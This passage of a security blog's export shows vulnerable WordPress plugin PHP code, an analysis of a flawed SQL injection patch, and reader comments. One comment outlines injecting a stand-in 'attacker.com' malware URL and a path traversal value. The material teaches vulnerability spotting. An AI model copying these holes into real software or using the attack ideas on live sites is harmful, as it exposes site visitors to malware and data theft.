&lt;?php else: ?&gt;
	&lt;tr&gt;
		&lt;td&gt;&lt;?php _e('No results', $sermon_domain) ?&gt;&lt;/td&gt;
	&lt;/tr&gt;
&lt;?php endif ?&gt;
&lt;?php
}
die();

?&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1443</wp:post_id>
		<wp:post_date>2011-05-06 05:30:39</wp:post_date>
		<wp:post_date_gmt>2011-05-06 12:30:39</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>percentage-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="cross-site-scripting"><![CDATA[cross site scripting]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="parameterized-queries"><![CDATA[parameterized queries]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>2057</wp:comment_id>
			<wp:comment_author><![CDATA[Zoran M]]></wp:comment_author>
			<wp:comment_author_email>raski19@gmail.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>93.138.91.80</wp:comment_author_IP>
			<wp:comment_date>2011-05-06 05:39:43</wp:comment_date>
			<wp:comment_date_gmt>2011-05-06 12:39:43</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Also, I don't like ''. Is it really required?]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1304685583.8833";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1304697747.9687";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>2058</wp:comment_id>
			<wp:comment_author><![CDATA[Zoran M]]></wp:comment_author>
			<wp:comment_author_email>raski19@gmail.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>93.138.91.80</wp:comment_author_IP>
			<wp:comment_date>2011-05-06 05:40:58</wp:comment_date>
			<wp:comment_date_gmt>2011-05-06 12:40:58</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Also, I don’t like '$_SERVER['PHP_SELF']' part. Is it really required?]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1304697744.9876";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1304685658.4296";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Notes</title>
		<link>http://spotthevuln.com/2011/05/notes/</link>
		<pubDate>Mon, 09 May 2011 12:30:12 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1448</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>The best way to waste your life, ... is by taking notes. The easiest way to avoid living is to just watch. Look for the details. Report. Don't participate.
Chuck Palahniuk</strong></blockquote>
[sourcecode language="php"]
&lt;?php
...snip...
		// tags
		$tags = explode(',', $_POST['tags']);
		$wpdb-&gt;query(&quot;DELETE FROM {$wpdb-&gt;prefix}sb_sermons_tags WHERE sermon_id = $id;&quot;);
		foreach ($tags as $tag) {
			$clean_tag = trim(mysql_real_escape_string($tag));
			$existing_id = $wpdb-&gt;get_var(&quot;SELECT id FROM {$wpdb-&gt;prefix}sb_tags WHERE name='$clean_tag'&quot;);
			if (is_null($existing_id)) {
				$wpdb-&gt;query(&quot;INSERT  INTO {$wpdb-&gt;prefix}sb_tags VALUES (null, '$clean_tag')&quot;);
				$existing_id = $wpdb-&gt;insert_id;
			}
			$wpdb-&gt;query(&quot;INSERT INTO {$wpdb-&gt;prefix}sb_sermons_tags VALUES (null, $id, $existing_id)&quot;);
		}
		sb_delete_unused_tags();
		// everything is fine, get out of here!
		if(!isset($error)) {
			sb_ping_gallery();
			echo &quot;&lt;script&gt;document.location = '&quot;.$_SERVER['PHP_SELF'].&quot;?page=sermon-browser/sermon.php&amp;saved=true';&lt;/script&gt;&quot;;
			die();
		}
	}

	$id3_tags = array();
	if (isset($_GET['getid3'])) {
		require_once('getid3/getid3.php');
		$file_data = $wpdb-&gt;get_row(&quot;SELECT name, type FROM {$wpdb-&gt;prefix}sb_stuff WHERE id = &quot;.$_GET['getid3']);
		if ($file_data !== NULL) {
			$getID3 = new getID3;
			if ($file_data-&gt;type == 'url') {
				$filename = substr($file_data-&gt;name, strrpos ($file_data-&gt;name, '/')+1);
				$sermonUploadDir = SB_ABSPATH.sb_get_option('upload_dir');
				$tempfilename = $sermonUploadDir.preg_replace('/([ ])/e', 'chr(rand(97,122))', '		').'.mp3';
				if ($tempfile = @fopen($tempfilename, 'wb'))
					if ($remote_file = @fopen($file_data-&gt;name, 'r')) {
						$remote_contents = '';
						while (!feof($remote_file)) {
							$remote_contents .= fread($remote_file, 8192);
							if (strlen($remote_contents) &gt; 65536)
							   break;
						}
						fwrite($tempfile, $remote_contents);
						fclose($remote_file);
						fclose($tempfile);
						$id3_raw_tags = $getID3-&gt;analyze(realpath($tempfilename));
						unlink ($tempfilename);
					}
			} else {
				$filename = $file_data-&gt;name;
				$id3_raw_tags = $getID3-&gt;analyze(realpath(SB_ABSPATH.sb_get_option('upload_dir').$filename));
			}
			if (!isset($id3_raw_tags['tags'])) {
				echo '&lt;div id=&quot;message&quot; class=&quot;updated fade&quot;&gt;&lt;p&gt;&lt;b&gt;'.__('No ID3 tags found.', $sermon_domain);
				if ($file_data-&gt;type == 'url')
					 echo ' Remote files must have id3v2 tags.';
				echo '&lt;/b&gt;&lt;/div&gt;';
			}
...snip...
?&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1448</wp:post_id>
		<wp:post_date>2011-05-09 05:30:12</wp:post_date>
		<wp:post_date_gmt>2011-05-09 12:30:12</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>notes</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>2074</wp:comment_id>
			<wp:comment_author><![CDATA[PHP, Solution, SQL Injection, Wordpress Vulnerability Code Example &laquo; SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2011/05/notes-sql-injection/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2011-05-13 05:32:56</wp:comment_date>
			<wp:comment_date_gmt>2011-05-13 12:32:56</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Notes [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1305528711.0017";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1305289976.4984";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>2070</wp:comment_id>
			<wp:comment_author><![CDATA[Abraham Kang]]></wp:comment_author>
			<wp:comment_author_email>abraham.kang@owasp.org</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>67.169.124.224</wp:comment_author_IP>
			<wp:comment_date>2011-05-13 00:00:35</wp:comment_date>
			<wp:comment_date_gmt>2011-05-13 07:00:35</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[1.  XSS on line 19.
2.  SQL Injection on line 27.
3.  Parameter Tampering on line 27.
4.  Malware or Rootkit distribution lines 27-44.

I am not a PHP jockey (more of a Java guy)

But to exploit 4 I would use SQL Injection to insert a row 
into sb_stuff where:

name=http://www.attacker.com/badstuff/malware.mp3
type=url

where id = all ids outstanding.

Then when a visitor tried to download an uploaded malware mp3 and 
listen to it they would get infected by malware sourced in from a 3rd party web site.

Also filename can have path traversal characters (if running PHP on a windows box) because the code looks only for the last "/" on line 31.

An attacker could use the SQL Injection to set name to:

aaa/..\..\..\system.ini

I am curious if there are any other problems with the code that was snipped in how it uses $filename and $file_data-&gt;name;


Regards,
Abe]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1305270035.5707";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1305528718.8281";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Notes - SQL Injection</title>
		<link>http://spotthevuln.com/2011/05/notes-sql-injection/</link>
		<pubDate>Fri, 13 May 2011 12:30:39 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1451</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Details</h1>
Affected Software: Sermon Browser Wordpress Plugin

Fixed in Version: .44

Issue Type: Cross Site Scripting

Original Code: <a href="http://spotthevuln.com/2011/05/notes/">Found Here</a>
<h1>Details</h1>
There are a couple of different issues here, but let’s focus on what the developers patched.  On line 27, the developer uses the $_GET[‘getid3’] value to build a dynamic SQL statement.  This is classic SQL injection.   The patch seems straight forward, escape the $_GET[‘getid3’] value before using it in the SQL statement.   Normally, SQL injection involves breaking out of a predefined SQL statement by closing off a quoted string and injecting your own SQL statement.  Most escaping functions escape quotes and other special characters so that an attacker cannot escape out of a quoted string.  There is a problem in this patch though.  The tainted value is NOT enclosed within quotes, so the attacker does not need to escape out of a quoted string.  The attacker is free to build a SQL injection payload as long as the payload doesn’t contain any special characters.  So, despite escaping the $_GET[‘getid3’] value, SQL injection is still possible.
<br><br>
Anyone spot the unpatched XSS?


<h1>Developers Solution</h1>
[sourcecode language="diff" highlight="27,28"]
&lt;?php
...snip...
		// tags
		$tags = explode(',', $_POST['tags']);
		$wpdb-&gt;query(&quot;DELETE FROM {$wpdb-&gt;prefix}sb_sermons_tags WHERE sermon_id = $id;&quot;);
		foreach ($tags as $tag) {
			$clean_tag = trim(mysql_real_escape_string($tag));
			$existing_id = $wpdb-&gt;get_var(&quot;SELECT id FROM {$wpdb-&gt;prefix}sb_tags WHERE name='$clean_tag'&quot;);
			if (is_null($existing_id)) {
				$wpdb-&gt;query(&quot;INSERT  INTO {$wpdb-&gt;prefix}sb_tags VALUES (null, '$clean_tag')&quot;);
				$existing_id = $wpdb-&gt;insert_id;
			}
			$wpdb-&gt;query(&quot;INSERT INTO {$wpdb-&gt;prefix}sb_sermons_tags VALUES (null, $id, $existing_id)&quot;);
		}
		sb_delete_unused_tags();
		// everything is fine, get out of here!
		if(!isset($error)) {
			sb_ping_gallery();
			echo &quot;&lt;script&gt;document.location = '&quot;.$_SERVER['PHP_SELF'].&quot;?page=sermon-browser/sermon.php&amp;saved=true';&lt;/script&gt;&quot;;
			die();
		}
	}

	$id3_tags = array();
	if (isset($_GET['getid3'])) {
		require_once('getid3/getid3.php');
-		$file_data = $wpdb-&gt;get_row(&quot;SELECT name, type FROM {$wpdb-&gt;prefix}sb_stuff WHERE id = &quot;.$_GET['getid3']);
+		$file_data = $wpdb-&gt;get_row(&quot;SELECT name, type FROM {$wpdb-&gt;prefix}sb_stuff WHERE id = &quot;.$wpdb-&gt;escape($_GET['getid3'])); 
		if ($file_data !== NULL) {
			$getID3 = new getID3;
			if ($file_data-&gt;type == 'url') {
				$filename = substr($file_data-&gt;name, strrpos ($file_data-&gt;name, '/')+1);
				$sermonUploadDir = SB_ABSPATH.sb_get_option('upload_dir');
				$tempfilename = $sermonUploadDir.preg_replace('/([ ])/e', 'chr(rand(97,122))', '		').'.mp3';
				if ($tempfile = @fopen($tempfilename, 'wb'))
					if ($remote_file = @fopen($file_data-&gt;name, 'r')) {
						$remote_contents = '';
						while (!feof($remote_file)) {
							$remote_contents .= fread($remote_file, 8192);
							if (strlen($remote_contents) &gt; 65536)
							   break;
						}
						fwrite($tempfile, $remote_contents);
						fclose($remote_file);
						fclose($tempfile);
						$id3_raw_tags = $getID3-&gt;analyze(realpath($tempfilename));
						unlink ($tempfilename);
					}
			} else {
				$filename = $file_data-&gt;name;
				$id3_raw_tags = $getID3-&gt;analyze(realpath(SB_ABSPATH.sb_get_option('upload_dir').$filename));
			}
			if (!isset($id3_raw_tags['tags'])) {
				echo '&lt;div id=&quot;message&quot; class=&quot;updated fade&quot;&gt;&lt;p&gt;&lt;b&gt;'.__('No ID3 tags found.', $sermon_domain);
				if ($file_data-&gt;type == 'url')
					 echo ' Remote files must have id3v2 tags.';
				echo '&lt;/b&gt;&lt;/div&gt;';
			}
...snip...
?&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1451</wp:post_id>
		<wp:post_date>2011-05-13 05:30:39</wp:post_date>
		<wp:post_date_gmt>2011-05-13 12:30:39</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>notes-sql-injection</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="post_tag" nicename="encode"><![CDATA[Encode]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="post_tag" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<category domain="post_tag" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>2075</wp:comment_id>
			<wp:comment_author><![CDATA[Zoran M]]></wp:comment_author>
			<wp:comment_author_email>raski19@gmail.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>93.138.61.51</wp:comment_author_IP>
			<wp:comment_date>2011-05-13 05:40:09</wp:comment_date>
			<wp:comment_date_gmt>2011-05-13 12:40:09</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Hello, all!

Line 19: echo "document.location = '".$_SERVER['PHP_SELF']."?page=sermon-browser/sermon.php&amp;saved=true';"; is vulnerable to XSS.

$_SERVER['PHP_SELF'] can be manipulated and allow XSS attack.

//Zok]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1305528708.9535";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1305290409.5105";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Expands</title>
		<link>http://spotthevuln.com/2011/05/expands-2/</link>
		<pubDate>Mon, 16 May 2011 12:30:30 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1455</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Life shrinks or expands in proportion to one's courage
Anais Nin</strong></blockquote>
[sourcecode language="php"]
&lt;?php

require_once('admin.php');
header('Content-Type: ' . get_option('html_type') . '; charset=' . get_option('blog_charset'));

if ( ! current_user_can('edit_posts') )
	wp_die( __( 'Cheatin&amp;#8217; uh?' ) );

function aposfix($text) {
	$translation_table[chr(34)] = '&amp;quot;';
	$translation_table[chr(38)] = '&amp;';
	$translation_table[chr(39)] = '&amp;apos;';
	return preg_replace(&quot;/&amp;(?![A-Za-z]{0,4}\w{2,3};|#[0-9]{2,3};)/&quot;,&quot;&amp;amp;&quot; , strtr($text, $translation_table));
}


function press_it() {
	// define some basic variables
	$quick['post_status'] = 'draft'; // set as draft first
	$quick['post_category'] = isset($_REQUEST['post_category']) ? $_REQUEST['post_category'] : null;
	$quick['tax_input'] = isset($_REQUEST['tax_input']) ? $_REQUEST['tax_input'] : '';
	$quick['post_title'] = isset($_REQUEST['title']) ? $_REQUEST['title'] : '';
	$quick['post_content'] = '';

	// insert the post with nothing in it, to get an ID
	$post_ID = wp_insert_post($quick, true);
	$content = isset($_REQUEST['content']) ? $_REQUEST['content'] : '';

	$upload = false;
	if( !empty($_REQUEST['photo_src']) &amp;&amp; current_user_can('upload_files') )
		foreach( (array) $_REQUEST['photo_src'] as $key =&gt; $image)
			// see if files exist in content - we don't want to upload non-used selected files.
			if( strpos($_REQUEST['content'], $image) !== false ) {
				$desc = isset($_REQUEST['photo_description'][$key]) ? $_REQUEST['photo_description'][$key] : '';
				$upload = media_sideload_image($image, $post_ID, $desc);

				// Replace the POSTED content &lt;img&gt; with correct uploaded ones. Regex contains fix for Magic Quotes
				if( !is_wp_error($upload) ) $content = preg_replace('/&lt;img ([^&gt;]*)src=\\\?(\&quot;|\')'.preg_quote($image, '/').'\\\?(\2)([^&gt;\/]*)\/*&gt;/is', $upload, $content);
			}

	// set the post_content and status
	$quick['post_status'] = isset($_REQUEST['publish']) ? 'publish' : 'draft';
	$quick['post_content'] = $content;
	// error handling for $post
	if ( is_wp_error($post_ID)) {
		wp_die($id);
		wp_delete_post($post_ID);
	// error handling for media_sideload
	} elseif ( is_wp_error($upload)) {
		wp_die($upload);
		wp_delete_post($post_ID);
	} else {
		$quick['ID'] = $post_ID;
		wp_update_post($quick);
	}
	return $post_ID;
}

// For submitted posts.
if ( isset($_REQUEST['action']) &amp;&amp; 'post' == $_REQUEST['action'] ) {
	check_admin_referer('press-this');
	$post_ID = press_it();
	$posted =  $post_ID;
} else {
	$post_ID = 0;
}

// Set Variables
$title = isset($_GET['t']) ? esc_html(aposfix(stripslashes($_GET['t']))) : '';
$selection = isset($_GET['s']) ? trim( aposfix( stripslashes($_GET['s']) ) ) : '';
if ( ! empty($selection) ) {
	$selection = preg_replace('/(\r?\n|\r)/', '&lt;/p&gt;&lt;p&gt;', $selection);
	$selection = '&lt;p&gt;'.str_replace('&lt;p&gt;&lt;/p&gt;', '', $selection).'&lt;/p&gt;';
}
$url = isset($_GET['u']) ? esc_url($_GET['u']) : '';
$image = isset($_GET['i']) ? $_GET['i'] : '';
...snip...
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1455</wp:post_id>
		<wp:post_date>2011-05-16 05:30:30</wp:post_date>
		<wp:post_date_gmt>2011-05-16 12:30:30</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>expands-2</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>2087</wp:comment_id>
			<wp:comment_author><![CDATA[Cross-Site Scripting (XSS), PHP, Solution, Wordpress Vulnerability Code Example &laquo; SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2011/05/expands-cross-site-scripting/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2011-05-20 05:35:12</wp:comment_date>
			<wp:comment_date_gmt>2011-05-20 12:35:12</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Expands [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1305894912.5435";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1306103389.6438";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>2085</wp:comment_id>
			<wp:comment_author><![CDATA[bkrios]]></wp:comment_author>
			<wp:comment_author_email>billy.rios+wordpress@gmail.com</wp:comment_author_email>
			<wp:comment_author_url>http://xs-sniper.com</wp:comment_author_url>
			<wp:comment_author_IP>76.102.16.4</wp:comment_author_IP>
			<wp:comment_date>2011-05-20 00:57:03</wp:comment_date>
			<wp:comment_date_gmt>2011-05-20 07:57:03</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[We'll try to mix it up in the next few weeks.  We try to keep the code sample short, logic flaws and insecure defaults sometime span multiple code files and can be difficult to present in a concise manner.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>2084</wp:comment_parent>
			<wp:comment_user_id>2</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1305878223.2319";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>2084</wp:comment_id>
			<wp:comment_author><![CDATA[Abraham Kang]]></wp:comment_author>
			<wp:comment_author_email>abraham.kang@owasp.org</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
